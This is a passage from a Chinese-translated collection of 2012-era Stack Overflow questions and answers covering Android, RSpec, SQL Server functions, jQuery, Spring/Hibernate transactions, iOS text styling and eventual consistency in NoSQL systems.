这个概念是有道理的。正如 Oli 所添加的，您希望移动 32，而不是 31 - 移动 31 会将其放在第 31 位，因此如果您向右移动以尝试获取第一个数字，您最终会丢失一点，第二个数字可能很大，因为你可以在最高位放一个 1。

但是如果你想做位操作，我会这样做：

```
k = 1 << 32;
k = k|5; 
```

它确实应该产生相同的结果。您确定您的机器上的 long 是 64 位吗？情况并非总是如此（尽管我认为通常是这样）。如果`long`实际是 32 位，`2<<31`则结果为 0。

R有多大？如果 R 不超过 65535，您可以使用 32 位大小的变量...*

# android - 有没有办法从editText中获取日期和时间

> ID：10078495
> 
> 赞同：0
> 
> 时间：2012-04-09T19:18:03.883
> 
> 标签：android, datetime

我有两个editText，一个用于日期，一个用于时间。有没有办法从两者中获取信息，以便我可以使用下面的代码并存储正确的日期和时间？

```
 newTime.year = dateAndTime.get(Calendar.YEAR);
    newTime.month = dateAndTime.get(Calendar.MONTH);
    newTime.monthDay = dateAndTime.get(Calendar.DAY_OF_MONTH);
    newTime.hour = dateAndTime.get(Calendar.HOUR_OF_DAY);
    newTime.minute = dateAndTime.get(Calendar.MINUTE);

    enteredTime = (int) ((newTime).toMillis(true) / 1000); 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-09T19:31:41.280

我认为将 EditText 字段用于日期和时间是一个非常糟糕的主意。您可以使用特定的视图控件为用户提供更好的界面：

[http://developer.android.com/resources/tutorials/views/hello-datepicker.html](http://developer.android.com/resources/tutorials/views/hello-datepicker.html) http://developer.android.com/resources/tutorials/views/hello-timepicker.html

# ruby-on-rails-3 - 如何确保我的控制器和模型规格与 rspec 和 rails 一致？

> ID：10078498
> 
> 赞同：1
> 
> 时间：2012-04-09T19:18:08.577
> 
> 标签：ruby-on-rails-3, rspec, rspec-rails

这可能更像是一个哲学问题，但是...

当我使用 rspec 和 rails 时，我越来越习惯于使用模拟对象和存根将我的控制器测试与我的模型隔离开来，反之亦然。

然而，这让我有一种挥之不去的感觉，即并非所有东西都正确连接。

例如，我可能有一个这样的控制器规范：

```
it "passes a list of awesome cheeses to the view" do
  Cheese.should_receive(:awesome).and_return( [ ] ) # one method name
  get 'show'
  assigns[:awesome_cheeses].should_not be_nil
end 
```

然后是我的 Cheese 模型的规格，例如：

```
it "should return a list of awesome cheeses" do
  Cheese.create!(:name => "American", :is_awesome => false)
  Cheese.create!(:name => "Gouda", :is_awesome => true)
  Cheese.awesome_cheeses.should_not be_nil # different method name!
end 
```

如果这两个规范都通过了，我的应用程序仍然会被破坏，因为我在第一个规范中存根的方法与我确保在第二个规范中有效的方法名称不同。

现在，对此的一个答案是“您需要集成测试”，但除非我的集成测试非常彻底，否则我可能会错过像这样的错误。

是否有任何自动化方法可以将我期望在控制器测试中使用的方法与我在模型测试中实际测试的方法进行比较？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-07-30T18:16:15.823

现在看起来 Rspec 有一个名为[rspec-fire](https://github.com/xaviershay/rspec-fire)的扩展，它声称可以帮助解决这个问题。我还没有尝试过，但想在这里为其他人记录下来。

我也想链接到这个演讲，因为它有一个很棒的标题： http: [//www.infoq.com/presentations/integration-tests-scam](http://www.infoq.com/presentations/integration-tests-scam)

# sql - 在函数中设置事务隔离级别

> ID：10078504
> 
> 赞同：4
> 
> 时间：2012-04-09T19:19:04.350
> 
> 标签：sql, sql-server, sql-server-2008, select

当我想添加行时

> 设置事务隔离级别读取未提交

在 SQL SERVER 2008 中我的函数定义脚本的 BEGIN 子句之后，它说：

```
Invalid use of a side-effecting operator 'SET TRANSACTION ISOLATION LEVEL' within a function 
```

如何在函数定义中实现此功能？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-04-09T19:21:14.087

你不能。

您需要在调用该函数的批处理开始时设置它。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-04-09T19:21:37.187

你不能。 [UDF 不支持集合操作。](http://blog.sqlauthority.com/2007/05/29/sql-server-user-defined-functions-udf-limitations/)

~~函数始终在事务的上下文中执行（隐式或显式），并且一旦事务开始，您就无法更改事务的隔离级别。~~

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-04-09T19:24:22.880

您是否尝试过解决无法设置事务隔离的问题？

```
Select * from dbo.MyTable with (nolock) 
```

# javascript - 替换 div 内的文本而不影响其中的任何 HTML 标签

> ID：10078508
> 
> 赞同：1
> 
> 时间：2012-04-09T19:19:24.847
> 
> 标签：javascript, jquery

我看到这个问题已经被问过很多次了。但是，不幸的是，我还没有遇到直接的解决方案。大多数解决方案都围绕 div 中的多个节点。

所以这里有问题。我有以下标记：

```
<div class="test">Text1<span></span></div> 
```

我需要将“Text1”替换为“Text2”而不影响跨度标记和附加到跨度标记的事件处理程序。

做类似`$('.test')html('Text2<span></span>')`的事情会替换文本。但是，删除 span 标记上的事件处理程序，这是不希望的。我正在为此寻找一种快速有效的方法。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-09T19:23:26.703

用标签包裹可替换文本：

```
<div class="test"><span class="test-text">Text1</span><span></span></div> 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-04-09T19:28:25.810

您可以使用[contents访问](http://api.jquery.com/contents/)[文本节点](https://developer.mozilla.org/en/XUL/textnode)本身。现在，如果您知道元素以文本开头，您可以这样做：

```
$($('.test').contents()[0]).replaceWith('New Text')​; 
```

现在，如果您不知道文本节点数组中的位置，您可以使用以下方法进行过滤：

```
return this.nodeType === 3; 
```

并比较文本值（如果你知道的话）。

[小提琴](http://jsfiddle.net/eKfR9/)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-09T19:25:34.160

if you would add event handler with `.live` or `.on` functions (depends on jQuery version) .html('Text2') would work just fine.

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-04-09T19:31:07.387

假设要替换的文本总是在现有跨度之前，它将始终是`firstChild` *并且*它将是一个未包装的 textNode：

```
$('.test').click(
    function() {
        this.firstChild.nodeValue = 'Text2';
    });​ 
```

[JS 小提琴演示](http://jsfiddle.net/davidThomas/j4sQB/)。

为了确保只有第一个 textNode 被更改，而不管它在`.test`元素中的什么位置：

```
$('.test').click(
    function(e) {
        var newText = 'Text2',
            children = e.target.childNodes;
        for (var i=0,len=children.length;i<len;i++){
            if (children[i].nodeName == '#text'){
                children[i].nodeValue = newText;
                return false;
            }
        }
    });​ 
```

[JS 小提琴演示](http://jsfiddle.net/davidThomas/j4sQB/1/)。

# java - 与文件系统相比，使用数据库存储配置信息的优缺点是什么

> ID：10078511
> 
> 赞同：5
> 
> 时间：2012-04-09T19:19:35.533
> 
> 标签：java, sql, xml, relational-database, configuration-files

假设您的任务是编写一个必须以某种格式存储配置信息的 Web 应用程序。与将信息存储在文件中相比，将这些配置信息存储在关系数据库中的优点和缺点是什么？配置选项可能包括但不限于数据保留设置和与外部系统接口的设置（例如 IP 地址、端口、用户名、密码）。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-09T19:53:58.563

以下是优缺点总结

文件的优点：

1.  快速访问配置数据。（假设没有缓存）
2.  每个服务器都可以进行不同的配置（在负载平衡的情况下）
3.  您已经需要一个用于数据库凭据的文件，以便所有内容都可以存储在一个地方。

文件的缺点：

1.  在负载平衡环境中进行配置很困难。
2.  在开发中添加设置时，最记得将它们移动到生产中每台服务器上的文件中。
3.  如果您想编写控制面板以在运行时更改设置，则配置必须可由网络服务器写入。由于时间问题和/或锁定，在控制面板中操作文件很麻烦。

数据库的优点：

1.  负载均衡器可以跨集群共享配置
2.  远程检查设置或更改设置非常容易，例如在 phpMyAdmin 或直接 sql 客户端中。
3.  控制面板开发变得简单。
4.  可以通过在 memcached 或内存中的哈希中缓存配置来减轻性能影响。
5.  程序员更有可能控制设置而不是 IT 人员，或者至少可以通过控制面板进行控制。

数据库的缺点：

1.  如果您连续获取设置，性能可能会变慢。
2.  如果您不提供工具，系统管理员可能更难管理产品而不是文件。他们可能不是 sql 专家。
3.  集群更痛苦。

这归结为个人偏好以及任何当前或未来可能的提供简单配置的要求。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-09T19:24:28.570

And now a real answer.

I guess in the end it is a matter of taste

Pro:

*   you could add an admin page to edit the settings in your applications

Con:

*   if your database is not available, your settings are also gone
*   if you migrate a database to a different environment (e.g. a production database to test to do some issue checking) your settings are included
*   slightly harder to deploy
*   more difficult to add to version control
*   you need a file anyway to store your database credentials

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-04-09T19:23:21.220

因为您所要做的就是正确配置连接池（无论如何您都应该这样做），然后您就知道所有设置的位置。此外，它们可以在运行时更新，随着应用程序的启动或关闭而更新，并且在部署应用程序时它们不能被踩踏。

各种好理由。

# perl - 在 Perl CGI 中发送标头后如何保存 cookie？

> ID：10078514
> 
> 赞同：2
> 
> 时间：2012-04-09T19:19:44.497
> 
> 标签：perl, cookies, web, cgi

我知道您通过 HTTP 标头将 cookie 发送到用户的浏览器，但是在标头发送后您如何执行此操作。例如，您在要授予会话范围范围的表单中设置一个值。

谢谢！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-09T19:21:51.187

你不能。Cookie 仅设置在标头中。HTTP 无法在其他地方设置它们。

如果要根据表单数据设置 cookie，则在对表单提交请求的响应中进行。

如果您想同时使用数据来生成 cookie 和生成表单，请在发送标头之前将该数据放入变量中并在两个位置使用它。

（您可以生成 JavaScript 以在 HTML 正文中设置 cookie……但这会不必要地复杂和不可靠）。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-10T00:03:05.263

如果你想在你已经发送了一个响应头之后设置一个 cookie，你必须让客户端加载其他可以设置 cookie 的东西。这可能是通过 Ajax 响应、图像链接或其他方式。您可能会自动关闭此功能或要求用户更新某些内容。

# android - 在 Android 项目中使用 Jmagick

> ID：10078516
> 
> 赞同：4
> 
> 时间：2012-04-09T19:20:08.453
> 
> 标签：android, jmagick

我会将[Jmagick](http://www.jmagick.org/index.html)用于 Android 项目。是否可以？我必须用ndk重新编译源代码？是否有一些教程/指南？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-09T19:37:35.687

这是一个带有 ImageMagick 编译版本的 android 项目： [Android-ImageMagick](https://github.com/lilac/Android-ImageMagick)

# json - ServiceStack：反序列化 JSON 对象的集合

> ID：10078518
> 
> 赞同：2
> 
> 时间：2012-04-09T19:20:10.550
> 
> 标签：json, servicestack

我有一个简单的 json 字符串，其中包含一组对象 [http://sandapps.com/InAppAds/ads.json.txt](http://sandapps.com/InAppAds/ads.json.txt)

当我调用 GetAsync 来获取对象时，集合返回 1 个元素而不是 4 个元素并且它是空的：

```
new JsonServiceClient ().GetAsync<List<CrossSell>> (url, Success, Failure); 
```

我的课很简单：

```
class CrossSell 
{
    public string ID { get; set; }  
    public string AppCategory { get; set; } 
    public string AppID { get; set; }   
    public string Name { get; set; }    
    public string ImageUrl { get; set; }    
    public string Copy { get; set; }    
    public string Device { get; set; }  
    public string Link { get; set; }    
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-09T19:47:57.687

JSON 假定响应 DTO 如下：

```
class CrossSellResponse {
  List<CrossSell> CrossSells { get; set; }
}

new JsonServiceClient().GetAsync<CrossSellResponse> (url, Success, Failure); 
```

而不是您的 C# 示例所建议的裸数组：

```
new JsonServiceClient ().GetAsync<List<CrossSell>> (url, Success, Failure); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-09T19:49:10.240

我找到了答案。您需要创建一个包含 JSON 响应的整体包装类。我叫我的`CrossSellResponse`

```
public class CrossSellResponse
{
   public List< CrossSell> CrossSells {get; set;}
} 
```

该类`CrossSell`定义集合中的数据并以区分大小写的方式匹配字段名称。响应负载属性`CrossSells`的名称与 json 流中的集合名称相匹配。

# java - Spring集成测试-配置中的事务声明似乎破坏了测试

> ID：10078519
> 
> 赞同：0
> 
> 时间：2012-04-09T19:20:23.707
> 
> 标签：java, spring, hibernate, integration-testing, spring-test

我正在玩 Spring MVC + Hibernate + MySQL“Hello World”应用程序，目前正在尝试使用 jUnit 在 Spring MVC 控制器上运行以下集成测试。

```
@RunWith(SpringJUnit4ClassRunner.class)
@ContextConfiguration({"file:src/main/webapp/WEB-INF/springapp-servlet.xml"})
public class InventoryControllerIT
{
    @Autowired
    private InventoryController controller;

    @Test
    public void handleRequest_anyRequest_returnsSuccessfully() throws Exception
    {       
        ModelAndView modelAndView = this.controller.handleRequest(null, null);
    }
} 
```

但是，每次我这样做时，都会出现以下异常：

```
org.springframework.beans.factory.NoSuchBeanDefinitionException: No matching bean of type [springapp.web.InventoryController] found for dependency: expected at least 1 bean which qualifies as autowire candidate for this dependency. 
```

以前我没有实现任何真正的数据访问并且测试通过了，但是现在我已经添加了我的 DAO 的 Hibernate 实现以及 Spring 事务管理，我得到了这个错误。以下是我的小程序上下文配置 xml 的相关部分：

```
 <?xml version="1.0" encoding="UTF-8"?>

<beans xmlns="http://www.springframework.org/schema/beans"
    xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:p="http://www.springframework.org/schema/p"
    xmlns:tx="http://www.springframework.org/schema/tx"
    xsi:schemaLocation="http://www.springframework.org/schema/beans 
                           http://www.springframework.org/schema/beans/spring-beans.xsd
                           http://www.springframework.org/schema/tx
                           http://www.springframework.org/schema/tx/spring-tx.xsd">

    <bean name="/hello.htm" class="springapp.web.InventoryController">
        <property name="productManager" ref="productManager" />
        <property name="productDao" ref="productDao" />
        <property name="sessionFactory" ref="sessionFactory" />
    </bean>

    ...

    <!-- Hibernate -->
    <bean id="sessionFactory"
        class="org.springframework.orm.hibernate4.LocalSessionFactoryBean">

        <property name="dataSource">
            <ref bean="dataSource" />
        </property>

        <property name="hibernateProperties">
            <props>
                <prop key="hibernate.dialect">org.hibernate.dialect.MySQLDialect</prop>
                <prop key="hibernate.show_sql">true</prop>
            </props>
        </property>

        <property name="mappingJarLocations">
            <list>
                <value>WEB-INF/lib/springapp-dataaccess*.jar</value>
            </list>
        </property>
    </bean>

    <bean id="productDao" class="springapp.dataaccess.dao.ProductHibernateDao">
        <property name="sessionFactory" ref="sessionFactory" />
    </bean>

    <tx:annotation-driven />

    <bean id="transactionManager"
        class="org.springframework.orm.hibernate4.HibernateTransactionManager"
        p:sessionFactory-ref="sessionFactory" />

</beans> 
```

如果我`<tx:annotation-driven />`从配置中删除，则不会发生上述异常，但是测试失败，因为处理程序中发生的数据访问调用不再具有打开的事务。该应用程序在测试之外运行良好。有人对问题所在有任何想法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-09T19:47:28.140

当`InventoryController`实现任何接口时，Spring 默认使用基于接口的代理对其应用事务方面。这样的代理实现了 的接口`InventoryController`，但它不是 的子类`InventoryController`，因此不能注入到类型的字段中`InventoryController`。

您要么需要使用接口作为要自动装配的字段类型，要么将 Spring 配置为应用基于目标类的代理。

**也可以看看：**

*   [7.6 代理机制](http://static.springsource.org/spring/docs/3.0.x/spring-framework-reference/html/aop.html#aop-proxying)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-10T07:48:00.927

在运行我正在构建的小型库的单元测试时，我遇到了类似的问题。

替换你的：

```
<tx:annotation-driven /> 
```

和

```
<tx:annotation-driven transaction-manager="transactionManager" proxy-target-class="true"/> 
```

请注意，在我的项目中，我还必须为单元测试添加以下依赖项（maven 项目）：

```
 <dependency>
        <groupId>cglib</groupId>
        <artifactId>cglib</artifactId>
        <version>2.2.2</version>
        <scope>test</scope>
    </dependency> 
```

此致。

# javascript - JS 日期验证增强

> ID：10078528
> 
> 赞同：0
> 
> 时间：2012-04-09T19:21:01.463
> 
> 标签：javascript, validation, date

我继承了以下脚本，需要对其进行改进。该函数检查是否只输入了允许的字符 (0123456789/)，然后将输入的日期格式化为 1/1/12 将重新格式化为 01/01/2012。稍作调整后，这部分工作正常。我现在需要进一步验证，如果省略了年份，则添加年份，这意味着如果用户输入 1/1，则需要对其进行格式化并添加当前年份（例如 01/01/2012）。

用户输入和所需（工作）输出的示例

*   a/a/a 警告用户错误 - 检查
*   1/2/10 将输入字段更新为 01/03/2010
*   01/01/12 将输入字段更新为 01/01/2012
*   1/10/2 将输入字段更新为 01/10/2002

所需更新（除上述内容外）1/9 更新输入字段为 01/09/2012

这是当前功能（只要保留上述功能，欢迎您更改，重写，等等）。jQuery 1.7 库正在使用中，可以实现。

```
function ValidateDate(obj)
{
/************************************************
DESCRIPTION: Validates that a string contains only 
    valid dates with 2 digit month, 2 digit day, 
    4 digit year. Date separator has to be /
    Uses combination of regular expressions and 
    string parsing to validate date.
    Ex. mm/dd/yyyy

PARAMETERS:
   ValidateDate(strValue) - String to be tested for validity

RETURNS:
   True if valid, otherwise false.

REMARKS:
   Avoids some of the limitations of the Date.parse()
   method such as the date separator character.
*************************************************/
    var checkOK = "0123456789/";
    var checkStr = obj.value;
    var allValid = true;
    var p = /(\d{1,2})\/(\d{1,2})\/(\d{1,4})/;
    var objRegExp = /^\d{1,2}(\-|\/|\.)\d{1,2}\1\d{4}$/;
    // check to see if valid characters were used       
    for (i = 0;  i < checkStr.length;  i++)
    {
        ch = checkStr.charAt(i);
        for (j = 0;  j < checkOK.length;  j++)
          if (ch == checkOK.charAt(j))
            break;
        if (j == checkOK.length)
        {
            allValid = false;
            break;
        }
    }
    if (!allValid)
    {
        alert("Please use only a combination of " + checkOK + "\'s charaters in the date field.  Dates should be entered in the format of mm/dd/yyyy.");
        setTimeout((function() { obj.select() }), 0);
        return (false);
    }       
    //  converts to mm/dd/yyyy format
    if (!obj.value.match(p)) return;
    num=new Array();
    num=obj.value.match(p);
    if (num[1].length == 1) num[1]="0" + num[1];
    if (num[2].length == 1) num[2]="0" + num[2];
    if (num[3].length == 1) num[3]="200" + num[3];
    if (num[3].length == 2) num[3]="20" + num[3];
    obj.value= num[1] + "/" + num[2] + "/" + num[3];
    //check to see if in correct format
    if(!objRegExp.test(obj.value))
    {
        alert('The date entered is not properly formatted.');
        return false; //doesn't match pattern, bad date
    }
    else{
        var arrayDate = obj.value.split(RegExp.$1); //split date into month, day, year
        var intDay = parseInt(arrayDate[1],10); 
        var intYear = parseInt(arrayDate[2],10);
        var intMonth = parseInt(arrayDate[0],10);
    //check for valid month
    if(intMonth > 12 || intMonth < 1) {
        alert('The date entered is invalid');
        return false;
    }

    //create a lookup for months not equal to Feb.
    var arrayLookup = { '01' : 31,'03' : 31, '04' : 30,'05' : 31,'06' : 30,'07' : 31,
                        '08' : 31,'09' : 30,'10' : 31,'11' : 30,'12' : 31}

    //check if month value and day value agree
    if(arrayLookup[arrayDate[0]] != null) {
      if(intDay <= arrayLookup[arrayDate[0]] && intDay != 0)
        return true; //found in lookup table, good date
    }

    //check for February
    var booLeapYear = (intYear % 4 == 0 && (intYear % 100 != 0 || intYear % 400 == 0));
    if( ((booLeapYear && intDay <= 29) || (!booLeapYear && intDay <=28)) && intDay !=0)
        return true; //Feb. had valid number of days
    }
    alert(obj.value + ' is not a valid date.');
    //  return false; //any other values, bad date
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-09T19:42:48.510

反对的几点：

*   您不必检查有效字符，因为您的匹配正则表达式已经需要它们。如果你真的想，使用`/^[\d\/]*$/.test()`而不是那个循环。
*   要匹配 1/1 之类的日期，请使用`/\d{1,2}\/\d{1,2}(\/\d{1,4})?/`as`p`并仅执行 a`num = obj.value.split("/")`而不是匹配组
*   要验证日期，请查看[使用日期对象的 javascript 日期验证](https://stackoverflow.com/q/6390815/1048572)
*   您还应该允许 ISO 日期格式 YYYY-MM-DD，它由`Date()`

# iphone - iOS：粗体和斜体在同一个词上

> ID：10078531
> 
> 赞同：6
> 
> 时间：2012-04-09T19:21:18.360
> 
> 标签：iphone, ios, xcode, bold, italic

**背景**：我一直在尝试用粗体和斜体字体以及普通字体显示一个句子。

**问题**：我怎样才能显示这样的“你好，我的名字是***字节***”。请注意，字节既是粗体又是斜体，而其他单词保持正常。

**我已经尝试过**：我认为 coreText 应该能够做一些事情，我只是无法找到正确的方法来做到这一点。我也使用了 TTTAttributeLabel 并且不能使它既粗体又斜体。我已经加载了 Three20，只是不知道要使用哪个或什么。Webview 不适用于我的背景。

* * *

**作为对 Carles Estevadeordal 的回复**：

```
UIWebView *webView = [[UIWebView alloc]initWithFrame:CGRectMake(10, 360, 300, 40)];
[webView setBackgroundColor: [UIColor clearColor]];
[webView loadHTMLString:[NSString stringWithFormat:@"<html><body style=\"background-color: transparent;\">Hello, my name is <b><i>Byte</b></i></body></html>"] baseURL:nil];
[self.view addSubview:webView]; 
```

这正是我使用的代码。它显示白色背景。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-04-10T20:47:16.040

睡个好觉后，我找到了一种使用[TTTAtributedlabel](https://github.com/mattt/TTTAttributedLabel)的方法。方法如下：

```
TTTAttributedLabel *attLabel = [[TTTAttributedLabel alloc]initWithFrame:CGRectMake(x, y, xx, yy)];
NSString *text = @"Hello, my name is Byte";

[attLabel setText:text afterInheritingLabelAttributesAndConfiguringWithBlock:^(NSMutableAttributedString *mutableAttributedString) {

    //font helvetica with bold and italic 
    UIFont *boldSystemFont = [UIFont fontWithName:@"Helvetica-BoldOblique" size:10];

    CTFontRef font = CTFontCreateWithName((__bridge CFStringRef)boldSystemFont.fontName, boldSystemFont.pointSize, NULL);

    NSRange boldRange = [[mutableAttributedString string] rangeOfString:@"Byte" options:NSCaseInsensitiveSearch];
    [mutableAttributedString addAttribute:(NSString *)kCTFontAttributeName value:(__bridge id)font range:boldRange];

    CFRelease(font);

    return mutableAttributedString;
}]; 
```

我仍然没有办法将 2 个属性（即：分别为粗体和斜体）添加到同一个单词/字母中。但这可以解决问题。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-01-10T14:10:15.553

如果您仍然对此问题的 CoreText 解决方案感兴趣：

```
newFont = CTFontCreateCopyWithSymbolicTraits(fontRef,
                                             self.textSize,
                                             NULL,
                                             kCTFontBoldTrait | kCTFontItalicTrait,
                                             kCTFontBoldTrait | kCTFontItalicTrait);

[attrString addAttribute:(NSString*)kCTFontAttributeName
                   value:(id)newFont
                   range:[copyString rangeOfString:customText.text]]; 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-06-19T11:15:46.930

您可以在 sender 是 UIButton 的实例的情况下使用它

```
 sender.titleLabel.font=[UIFont fontWithName:@"Helvetica-BoldOblique" size:18.0f]; 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-04-11T15:25:36.420

添加两个属性（这是非 ARC 代码）：

```
#define kLabelFontSize 16.0

NSString labelString = @"Let's slide loudly";

[self.tttLabel setText:labelString afterInheritingLabelAttributesAndConfiguringWithBlock:^NSMutableAttributedString *(NSMutableAttributedString *mutableAttributedString) {

    UIFont *boldSystemFont = [UIFont boldSystemFontOfSize:kLabelFontSize];
    CTFontRef boldFont = CTFontCreateWithName((CFStringRef)boldSystemFont.fontName, boldSystemFont.pointSize, NULL);
    if (boldFont) {
        [mutableAttributedString addAttribute:(NSString *)kCTFontAttributeName value:(id)boldFont range:NSMakeRange(6, 11)];
        CFRelease(boldFont);
    }

    UIFont *italicSystemFont = [UIFont italicSystemFontOfSize:kLabelFontSize];
    CTFontRef italicFont = CTFontCreateWithName((CFStringRef)boldSystemFont.fontName, italicSystemFont.pointSize, NULL);
    if (italicFont) {
        [mutableAttributedString addAttribute:(NSString *)kCTFontAttributeName value:(id)italicFont range:NSMakeRange(12, 18)];
        CFRelease(italicFont);
    }

    }];

    return mutableAttributedString;
}]; 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-04-09T22:16:32.463

如果句子具有固定格式，最简单的解决方案是使用 2 种不同的 UILabel，一种使用普通字体，另一种使用粗体和斜体字体集。

如果句子是动态的，那么您应该使用 UIWebView 对象，因为它是一个 lavel 并加载一个简单的网页，其中包含您的文本和 < b > < i > </i > </b > 字段在您需要时设置在现场粗体和斜体如：

```
[myWebViewLabel loadHTMLString:[NSString stringWithFormat:@"<html><body style=\"background-color: transparent;\">Hello, my name is <b><i>Byte</b></i></body></html>"] baseURL:nil]; 
```

我希望它有所帮助。

# jquery - 创建动态 JQuery 插件

> ID：10078534
> 
> 赞同：0
> 
> 时间：2012-04-09T19:21:23.623
> 
> 标签：jquery, plugins

我正在学习创建 JQuery 插件。目前，我有一个定义如下的插件：

```
(function ($) {
    $.fn.myPlugin = function (options) {
        var defaults = { e: 0 },
        settings = $.extend({}, defaults, options);

        var plugin = $.myPlugin.getHtml(options.e);
        if ((plugin != null) && (plugin != undefined) && (plugin.length > 0)) {
            this.html(plugin);
        }
    };

    $.myPlugin = {
        getHtml: function (e) {
            var s = "";
            if (e == 0) {
              s = "1";
            } else {
              s = "2";
            }
            return s;
        }
    };
})(jQuery); 
```

目前，我使用以下内容初始化此插件的一个实例：

```
$("#myDiv").myPlugin({ e: 0 }); 
```

如何向 myPlugin 添加一个计时器，以便每 15 秒我可以使用计数器更新 myDiv 的 html？

谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-09T20:18:12.373

这里有一小段代码，您可以按照上面评论的建议将其放入插件中以运行 setInterval。适应您的目的。查找 setInterval 以获取更多信息。

```
var counter = 0;
setInterval(function () {
   counter += 1;
   $.myPlugin.getHtml(counter)
}, 15000); 
```

# jquery - 在 express js 应用程序中正确包含 jquery mobile

> ID：10078535
> 
> 赞同：3
> 
> 时间：2012-04-09T19:21:36.940
> 
> 标签：jquery, node.js, jquery-mobile, express

我在我的快速应用程序中包含 jquery js 文件时遇到问题。我将 jquery.js 文件添加到 /public/javascripts 文件夹，并将我的 layout.jade 文件更改为如下：

```
!!!5
html
  head
    title= title
    meta(name='viewport', content='width=device-width,initial-scale=1')
    link(rel='stylesheet', href='/stylesheets/style.css')
    link(rel='stylesheet', href='/stylesheets/jquery.mobile-1.0.1.min.css')
    script(type='text/javascript', src='/javascripts/jquery.mobile-1.0.1.min.js')
    script(type='text/javascript', src='/javascripts/jquery-1.7.2.min.js')
  body!= body 
```

我还包括了 app.use(express.static(__dirname + '/public')); 在我的 app.js.我更改了我的 index.jade 如下以包含一些 jquery 移动标签：

```
div(data-role='page')
div(data-role='header')
    h1= title

div(data-role='content')    
    ul(data-role='listview',data-inset='true',data-filter='true')
            li: a(href='#') Acura 
```

问题是我无法正确渲染网页。我看不到任何与 jquery 相关的样式。有人知道我该如何解决吗？

谢谢，

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-04-09T20:00:47.280

您需要在 jQuery Mobile 文件之前包含 jQuery Core 文件，因为后者扩展了前者；因此，如果包含 Mobile 时 Core 不存在，则会出现错误。

您可以在此处参考正确的顺序以包含 jQuery 和 jQuery Mobile 文件：[http ://www.jquerymobile.com/download/](http://www.jquerymobile.com/download/)

您还使用了错误的 jQuery Core 版本（查看上面的链接以获得正确的版本）：

*   jQuery Mobile 1.0.1 支持 jQuery Core 1.6.4。
*   jQuery Mobile 1.1.0 RC-1 支持 jQuery Core 1.7.1。jQuery Mobile 目前不支持 jQuery Core 1.7.2（如[本文](http://jquerymobile.com/blog/2012/04/06/jquery-mobile-1-1-0-rc2/)所述）。

最后，我将在 jQuery Mobile 样式表之后包含您的自定义 CSS 样式表，以便更轻松地覆盖 jQuery Mobile CSS。

# nosql - 简单英语的最终一致性

> ID：10078540
> 
> 赞同：166
> 
> 时间：2012-04-09T19:21:53.223
> 
> 标签：nosql, computer-science, data-storage, eventual-consistency

我经常在关于 NoSQL、数据网格等的不同演讲中听到最终一致性。似乎最终一致性的定义在许多来源中有所不同（甚至可能取决于具体的数据存储）。

谁能简单解释一下最终一致性是什么，与任何具体的数据存储无关？

* * *

## 回答 #1

> 赞同：270
> 
> 时间：2012-04-09T19:25:06.857

最终一致性：

1.  我看了天气预报，得知明天要下雨。
2.  我告诉你明天会下雨。
3.  你的邻居告诉他的妻子明天会是晴天。
4.  你告诉邻居明天要下雨。

最终，所有的服务员（你、我​​、你的邻居）都知道了真相（明天会下雨），但与此同时，客户（他的妻子）却以为天气会晴朗，尽管她问了在一台或多台服务器（您和我）具有更新的值之后。

与 Strict Consistency / ACID 合规性相反：

1.  您的银行存款余额为 50 美元。
2.  你存入 100 美元。
3.  从任何地方的任何 ATM 查询您的银行余额为 150 美元。
4.  您的女儿用您的 ATM 卡取款 40 美元。
5.  从任何地方的任何 ATM 查询您的银行余额为 110 美元。

您的余额在任何时候都不能反映除您账户上所有交易的实际总和之外的任何内容。

如此多的 NoSQL 系统具有最终一致性的***原因***是，几乎所有的 NoSQL 系统都被设计为分布式的，而对于完全分布式的系统，维持严格的一致性需要超线性的开销（这意味着你只能在事情开始变慢之前扩展这么多下降，当他们这样做时，您需要在问题上投入成倍增加的硬件以保持扩展）。

* * *

## 回答 #2

> 赞同：126
> 
> 时间：2013-09-29T16:01:00.463

最终一致性：

1.  您的数据被复制到多台服务器上
2.  您的客户端可以访问任何服务器以检索数据
3.  有人将一段数据写入其中一台服务器，但尚未复制到其余服务器
4.  客户端使用数据访问服务器，并获取最新的副本
5.  不同的客户端（甚至是同一个客户端）访问不同的服务器（尚未获得新副本的服务器），并获取旧副本

基本上，因为跨多个服务器复制数据需要时间，读取数据的请求可能会发送到带有新副本的服务器，然后再发送到带有旧副本的服务器。术语“最终”意味着最终数据将被复制到所有服务器，因此它们都将拥有最新的副本。

如果您想要低延迟读取，则最终一致性是必须的，因为响应服务器必须返回自己的数据副本，并且没有时间咨询其他服务器并就数据内容达成共识。我写了[一篇博](http://distributedthoughts.com/2013/09/08/eventual-consistency/)文更详细地解释了这一点。

* * *

## 回答 #3

> 赞同：18
> 
> 时间：2017-12-10T14:40:28.863

认为您有一个应用程序及其副本。然后您必须向应用程序添加新数据项。

